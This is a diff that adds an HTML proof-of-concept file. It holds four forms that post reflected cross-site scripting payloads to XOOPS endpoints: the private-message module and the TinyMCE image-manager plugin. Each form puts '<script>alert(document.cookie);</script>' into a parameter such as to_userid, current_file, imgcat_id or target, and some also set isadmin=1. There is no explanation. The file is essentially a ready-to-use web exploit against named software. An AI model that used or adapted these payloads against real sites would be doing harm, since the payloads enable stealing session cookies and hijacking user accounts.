@@ -1,0 +1,32 @@
+
+<form action='http://www.example.com/modules/pm/pmlite.php' method="post">
+<input type="hidden" name="sendmod" value='1'>
+<input type="hidden" name="to_userid" value='"><script>alert(document.cookie);</script>'>
+<input type="submit" value="submit" id="btn">
+</form>
+
+
+<form action="http://www.example.com/class/xoopseditor/tinymce/tinymce/jscripts/tiny_mce/plugins/xoop simagemanager/xoopsimagebrowser.php?target=1" method="post">
+<input type="hidden" name="isadmin" value='1'>
+<input type="hidden" name="catreadcount" value='1'>
+<input type="hidden" name="catwritecount" value='1'>
+<input type="hidden" name="current_file" value='"><script>alert(document.cookie);</script>'>
+<input type="submit" value="submit" id="btn">
+</form>
+
+<form action="http://www.example.com/class/xoopseditor/tinymce/tinymce/jscripts/tiny_mce/plugins/xoop simagemanager/xoopsimagebrowser.php?target=1" method="post">
+<input type="hidden" name="isadmin" value='1'>
+<input type="hidden" name="catreadcount" value='1'>
+<input type="hidden" name="catwritecount" value='1'>
+<input type="hidden" name="imgcat_id" value='"><script>alert(document.cookie);</script>'>
+<input type="hidden" name="op" value='editcat'>
+<input type="submit" value="submit" id="btn">
+</form>
+
+<form action="http://www.example.com/class/xoopseditor/tinymce/tinymce/jscripts/tiny_mce/plugins/xoop simagemanager/xoopsimagebrowser.php" method="post">
+<input type="hidden" name="isadmin" value='1'>
+<input type="hidden" name="catreadcount" value='1'>
+<input type="hidden" name="catwritecount" value='1'>
+<input type="hidden" name="target" value='"><script>alert(document.cookie);</script>'>
+<input type="submit" value="submit" id="btn">
+</form>
